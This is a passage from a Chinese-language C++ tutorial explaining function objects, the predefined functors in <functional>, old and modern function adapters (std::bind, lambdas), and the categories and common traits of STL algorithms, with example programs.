<code>for_each</code>）不仅可以通过迭代器指定操作的范围，还可以接受一个额外的参数来<strong>定制其行为</strong>。这个参数通常是一个<strong>可调用 (Callable)</strong> 的实体，用于指定比较规则、判断条件或要执行的操作。</p><p>除了普通的函数指针，C++ 还提供了一种强大的可调用实体：**函数对象 (Function Object)**，也称为 **函数符 (Functor)**。</p><h3 id="16-5-1-函数符概念"><a href="#16-5-1-函数符概念" class="headerlink" title="16.5.1 函数符概念"></a>16.5.1 函数符概念</h3><p>函数对象（或函数符）是一个<strong>重载了函数调用运算符 <code>operator()</code></strong> 的类的对象。这意味着你可以像调用函数一样使用这个对象。</p><p><strong>基本结构:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数对象类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFunctor</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 重载 operator()</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// 可以是 const 成员函数</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Functor called with value: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyFunctor f; <span class="comment">// 创建函数对象</span></span><br><span class="line">    f(<span class="number">10</span>);       <span class="comment">// 调用对象，就像调用函数一样</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以临时创建并调用</span></span><br><span class="line">    MyFunctor()(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>为什么使用函数对象？</strong></p><ol><li><p><strong>携带状态:</strong> 与普通函数不同，函数对象是<strong>对象</strong>，它可以拥有自己的<strong>成员变量（状态）</strong>。这些状态可以在多次调用之间保持，或者在创建时进行配置。这对于需要累加、计数或根据特定上下文操作的算法非常有用。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; // for for_each</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数对象，用于计算总和并记录调用次数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SumAndCount</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SumAndCount() : sum(<span class="number">0</span>), count(<span class="number">0</span>) &#123;&#125; <span class="comment">// 初始化状态</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        sum += x;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSum</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> sum; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> count; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    SumAndCount sac; <span class="comment">// 创建带有状态的函数对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将函数对象传递给 for_each 算法</span></span><br><span class="line">    <span class="comment">// for_each 会对 nums 中的每个元素调用 sac.operator()</span></span><br><span class="line">    <span class="comment">// 注意：for_each 返回其函数对象参数的副本。</span></span><br><span class="line">    <span class="comment">// 如果需要获取最终状态，需要接收返回值（或使用引用包装器）</span></span><br><span class="line">    sac = <span class="built_in">std</span>::for_each(nums.begin(), nums.end(), sac);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sac.getSum() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; sac.getCount() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> <strong>内联可能性:</strong> 编译器通常更容易对函数对象的 <code>operator()</code> 进行<strong>内联 (inline)</strong> 优化，因为它在编译时是已知的。相比之下，通过函数指针调用函数通常会阻止内联，可能带来轻微的性能开销。</p></li><li><p> <strong>类型多样性:</strong> 每个函数对象类都是一个独立的类型。这允许我们通过模板特化或重载来为不同的函数对象提供不同的行为。</p></li></ol><h3 id="16-5-2-预定义的函数符"><a href="#16-5-2-预定义的函数符" class="headerlink" title="16.5.2 预定义的函数符"></a>16.5.2 预定义的函数符</h3><p>标准库在 <code>&lt;functional&gt;</code> 头文件中提供了一系列常用的<strong>预定义函数符</strong>，可以直接使用，省去了自己编写简单操作类的麻烦。</p><p>常见的预定义函数符包括：</p><ul><li><strong>算术类:</strong><ul><li>  <code>plus&lt;T&gt;</code>: 执行 <code>arg1 + arg2</code>。</li><li>  <code>minus&lt;T&gt;</code>: 执行 <code>arg1 - arg2</code>。</li><li>  <code>multiplies&lt;T&gt;</code>: 执行 <code>arg1 * arg2</code>。</li><li>  <code>divides&lt;T&gt;</code>: 执行 <code>arg1 / arg2</code>。</li><li>  <code>modulus&lt;T&gt;</code>: 执行 <code>arg1 % arg2</code>。</li><li>  <code>negate&lt;T&gt;</code>: 执行 <code>-arg</code>。</li></ul></li><li><strong>比较类:</strong><ul><li>  <code>equal_to&lt;T&gt;</code>: 执行 <code>arg1 == arg2</code>。</li><li>  <code>not_equal_to&lt;T&gt;</code>: 执行 <code>arg1 != arg2</code>。</li><li>  <code>less&lt;T&gt;</code>: 执行 <code>arg1 &lt; arg2</code> (默认排序规则)。</li><li>  <code>greater&lt;T&gt;</code>: 执行 <code>arg1 &gt; arg2</code>。</li><li>  <code>less_equal&lt;T&gt;</code>: 执行 <code>arg1 &lt;= arg2</code>。</li><li>  <code>greater_equal&lt;T&gt;</code>: 执行 <code>arg1 &gt;= arg2</code>。</li></ul></li><li><strong>逻辑类:</strong><ul><li>  <code>logical_and&lt;T&gt;</code>: 执行 <code>arg1 &amp;&amp; arg2</code>。</li><li>  <code>logical_or&lt;T&gt;</code>: 执行 <code>arg1 || arg2</code>。</li><li>  <code>logical_not&lt;T&gt;</code>: 执行 <code>!arg</code>。</li></ul></li></ul><p><strong>使用示例:</strong></p><p>这些预定义函数符常用于需要自定义比较或操作的 STL 算法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; // for sort, count_if</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt; // 包含预定义函数符</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 greater&lt;int&gt; 进行降序排序</span></span><br><span class="line">    <span class="built_in">std</span>::sort(nums.begin(), nums.end(), <span class="built_in">std</span>::greater&lt;<span class="keyword">int</span>&gt;());</span><br><span class="line">    <span class="comment">// 等价于 std::sort(nums.begin(), nums.end(), [](int a, int b)&#123; return a &gt; b; &#125;);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted descending: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n : nums) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: 9 8 5 4 2 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 less&lt;int&gt; 和 bind (或 lambda) 来查找小于 5 的元素数量</span></span><br><span class="line">    <span class="comment">// C++11 之前的做法可能使用 bind1st/bind2nd (已废弃) 或 boost::bind</span></span><br><span class="line">    <span class="comment">// C++11 及以后，lambda 更常用：</span></span><br><span class="line">    <span class="keyword">int</span> count_less_than_5 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(),</span><br><span class="line">                                          [](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x &lt; <span class="number">5</span>; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count less than 5: &quot;</span> &lt;&lt; count_less_than_5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3 (4, 2, 1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用预定义函数符和 lambda 结合 (虽然有点绕)</span></span><br><span class="line">    <span class="keyword">int</span> threshold = <span class="number">5</span>;</span><br><span class="line">    count_less_than_5 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(),</span><br><span class="line">                                     [threshold](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::less&lt;<span class="keyword">int</span>&gt;()(x, threshold); &#125;);</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count less than 5 (lambda+functor): &quot;</span> &lt;&lt; count_less_than_5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-5-3-自适应函数符和函数适配器-旧概念"><a href="#16-5-3-自适应函数符和函数适配器-旧概念" class="headerlink" title="16.5.3 自适应函数符和函数适配器 (旧概念)"></a>16.5.3 自适应函数符和函数适配器 (旧概念)</h3><p>在 C++11 引入 lambda 表达式之前，为了更灵活地组合和使用函数符，STL 提供了一些更复杂的机制，如<strong>自适应函数符 (Adaptable Functors)</strong> 和**函数适配器 (Function Adapters)**。</p><ul><li>  <strong>自适应函数符:</strong> 除了 <code>operator()</code>，还提供了一些嵌套的 <code>typedef</code>（如 <code>result_type</code>, <code>first_argument_type</code>, <code>second_argument_type</code>），使得适配器能够了解函数符的参数和返回类型。预定义的函数符大多是自适应的。</li><li><strong>函数适配器:</strong> 用于修改或绑定函数符的参数。<ul><li>  <strong>绑定器 (Binders):</strong> 如 <code>bind1st</code> 和 <code>bind2nd</code> (在 C++11 中<strong>废弃</strong>，C++17 中<strong>移除</strong>)，用于将二元函数符的一个参数绑定到特定值，生成一个一元函数符。例如，<code>bind1st(less&lt;int&gt;(), 5)</code> 会创建一个判断参数是否小于 5 的一元函数符。</li><li>  <strong>求反器 (Negators):</strong> 如 <code>not1</code> 和 <code>not2</code> (在 C++17 中<strong>废弃</strong>)，用于对一元或二元谓词函数符的结果取反。例如，<code>not1(is_even)</code> 会创建一个判断是否为奇数的一元函数符。</li><li>  <strong>成员函数适配器:</strong> 如 <code>mem_fun</code> 和 <code>mem_fun_ref</code> (在 C++11 中<strong>废弃</strong>，C++17 中<strong>移除</strong>)，用于将成员函数包装成可以被 STL 算法使用的函数对象。</li></ul></li></ul><p><strong>现代 C++ 的替代方案:</strong></p><p>这些旧的适配器机制比较复杂且用法受限。在现代 C++ (C++11 及以后) 中，它们的功能很大程度上被以下特性取代：</p><ul><li>  <strong><code>std::bind</code> (来自 <code>&lt;functional&gt;</code>):</strong> 一个更通用、更强大的绑定器，可以绑定普通函数、成员函数、函数对象，并灵活地指定参数占位符 (<code>std::placeholders::_1</code>, <code>_2</code> 等)。</li><li>  <strong>Lambda 表达式:</strong> 提供了非常简洁和灵活的方式来就地定义匿名函数对象，可以捕获上下文变量，极大地简化了需要传递自定义逻辑给算法的场景。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt; // for std::bind, std::less, std::placeholders</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">9</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> threshold = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::bind (替代 bind1st/bind2nd)</span></span><br><span class="line">    <span class="comment">// 创建一个一元谓词，判断 x &lt; threshold</span></span><br><span class="line">    <span class="keyword">auto</span> less_than_threshold = <span class="built_in">std</span>::bind(<span class="built_in">std</span>::less&lt;<span class="keyword">int</span>&gt;(), <span class="built_in">std</span>::placeholders::_1, threshold);</span><br><span class="line">    <span class="keyword">int</span> count1 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(), less_than_threshold);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count (bind): &quot;</span> &lt;&lt; count1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 Lambda 表达式 (更简洁)</span></span><br><span class="line">    <span class="keyword">int</span> count2 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(),</span><br><span class="line">                              [threshold](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x &lt; threshold; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count (lambda): &quot;</span> &lt;&lt; count2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然旧的适配器已被废弃，但理解函数对象的基本概念仍然很重要，因为它们是 STL 设计的基础，并且 lambda 表达式本质上就是编译器为我们自动生成的匿名函数对象。</p><h2 id="16-6-算法"><a href="#16-6-算法" class="headerlink" title="16.6 算法"></a>16.6 算法</h2><p>STL 的第三个主要组件是**算法 (Algorithms)**。STL 提供了大量用于处理容器（或其他序列）中数据的模板函数，这些函数统称为算法。它们定义在 <code>&lt;algorithm&gt;</code> 头文件中（还有一些数值算法在 <code>&lt;numeric&gt;</code> 中）。</p><p>STL 算法是<strong>泛型</strong>的，它们通过<strong>迭代器</strong>作用于元素范围，而不依赖于特定容器的实现。这使得同一个算法可以应用于 <code>vector</code>, <code>list</code>, <code>deque</code>, C 风格数组等多种数据结构。</p><h3 id="16-6-1-算法组"><a href="#16-6-1-算法组" class="headerlink" title="16.6.1 算法组"></a>16.6.1 算法组</h3><p>STL 算法可以根据其功能大致分为几类：</p><ol><li><strong>非修改序列操作 (Non-modifying sequence operations):</strong> 这些算法检查序列中的元素，但<strong>不修改</strong>元素的值。它们通常返回一个迭代器、一个布尔值或一个计数值。<ul><li>  例如: <code>find</code>, <code>find_if</code>, <code>count</code>, <code>count_if</code>, <code>equal</code>, <code>search</code>, <code>for_each</code>。</li></ul></li><li><strong>修改序列操作 (Modifying sequence operations):</strong> 这些算法会<strong>修改</strong>序列中的元素值或元素顺序。<ul><li>  例如: <code>copy</code>, <code>copy_if</code>, <code>move</code>, <code>transform</code>, <code>replace</code>, <code>replace_if</code>, <code>fill</code>, <code>generate</code>, <code>remove</code>, <code>remove_if</code>, <code>unique</code>, <code>reverse</code>, <code>rotate</code>, <code>random_shuffle</code> (C++17 废弃), <code>shuffle</code> (C++11)。</li></ul></li><li><strong>排序和相关操作 (Sorting and related operations):</strong> 用于对序列进行排序或执行基于排序的操作。<ul><li>  例如: <code>sort</code>, <code>stable_sort</code>, <code>partial_sort</code>, <code>nth_element</code>, <code>binary_search</code>, <code>lower_bound</code>, <code>upper_bound</code>, <code>equal_range</code>, <code>merge</code>, <code>inplace_merge</code>。</li></ul></li><li><strong>数值操作 (Numeric operations):</strong> 定义在 <code>&lt;numeric&gt;</code> 头文件中，用于执行数值计算。<ul><li>  例如: <code>accumulate</code>, <code>inner_product</code>, <code>partial_sum</code>, <code>adjacent_difference</code>, <code>iota</code> (C++11)。</li></ul></li><li><strong>堆操作 (Heap operations):</strong> 用于将范围维护成堆结构。<ul><li>  例如: <code>make_heap</code>, <code>push_heap</code>, <code>pop_heap</code>, <code>sort_heap</code>。</li></ul></li><li><strong>最小/最大操作 (Min/max operations):</strong><ul><li>  例如: <code>min</code>, <code>max</code>, <code>minmax</code> (C++11), <code>min_element</code>, <code>max_element</code>, <code>minmax_element</code> (C++11)。</li></ul></li><li><strong>排列操作 (Permutation operations):</strong><ul><li>  例如: <code>next_permutation</code>, <code>prev_permutation</code>。</li></ul></li></ol><h3 id="16-6-2-算法的通用特征"><a href="#16-6-2-算法的通用特征" class="headerlink" title="16.6.2 算法的通用特征"></a>16.6.2 算法的通用特征</h3><ul><li>  <strong>基于迭代器:</strong> 算法通常接受一对迭代器 <code>first</code> 和 <code>last</code> 作为参数，指定要操作的<strong>左闭右开区间 <code>[first, last)</code>**。<code>last</code> 指向的是要处理的最后一个元素的</strong>下一个**位置。</li><li>  <strong>不检查边界:</strong> 大多数算法假定传入的迭代器范围是有效的。传递无效范围（如 <code>end()</code> 在 <code>begin()</code> 之前，或迭代器指向不同容器）会导致未定义行为。</li><li><strong>不改变容器大小 (通常):</strong> 修改序列的算法（如 <code>replace</code>, <code>remove</code>）通常只<strong>覆盖</strong>或<strong>移动</strong>元素，而<strong>不改变容器的大小</strong>。例如，<code>remove</code> 只是将不被移除的元素移动到序列的前部，并返回一个指向新的逻辑末尾的迭代器，它<strong>不会</strong>真正删除容器中的元素。通常需要配合容器的 <code>erase</code> 方法来实际删除元素。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> val_to_remove = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 remove 将所有不等于 2 的元素移到前面</span></span><br><span class="line">    <span class="keyword">auto</span> new_end = <span class="built_in">std</span>::remove(v.begin(), v.end(), val_to_remove);</span><br><span class="line">    <span class="comment">// v 现在可能是 &#123;1, 3, 4, 5, ?, ?, ?&#125; (问号代表未定义的值)</span></span><br><span class="line">    <span class="comment">// new_end 指向第一个问号的位置 (逻辑上的新末尾)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after remove (before erase): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出可能包含未定义值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSize before erase: &quot;</span> &lt;&lt; v.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// size 仍然是 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 erase 删除从 new_end 到原始末尾的元素</span></span><br><span class="line">    v.erase(new_end, v.end());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after erase: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: 1 3 4 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSize after erase: &quot;</span> &lt;&lt; v.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// size 变为 4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>接受函数对象/Lambda:</strong> 许多算法接受一个额外的参数（通常是最后一个参数），用于指定自定义的比较逻辑（如 <code>sort</code> 的比较函数）、判断条件（如 <code>find_if</code>, <code>count_if</code> 的谓词）或要执行的操作（如 <code>for_each</code>, <code>transform</code> 的函数）。这可以是函数指针、函数对象或 lambda 表达式。</li><li><strong>谓词 (Predicate):</strong> 接受一个或两个参数并返回 <code>bool</code> 值的可调用实体。<ul><li>  <strong>一元谓词:</strong> <code>bool pred(const Type&amp; a)</code>，用于 <code>find_if</code>, <code>count_if</code>, <code>remove_if</code> 等。</li><li>  <strong>二元谓词:</strong> <code>bool pred(const Type&amp; a, const Type&amp; b)</code>，用于 <code>sort</code>, <code>unique</code> 等，通常表示某种顺序关系（如“小于”）。</li></ul></li></ul><p><strong>示例 (使用算法和 Lambda):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // for accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span 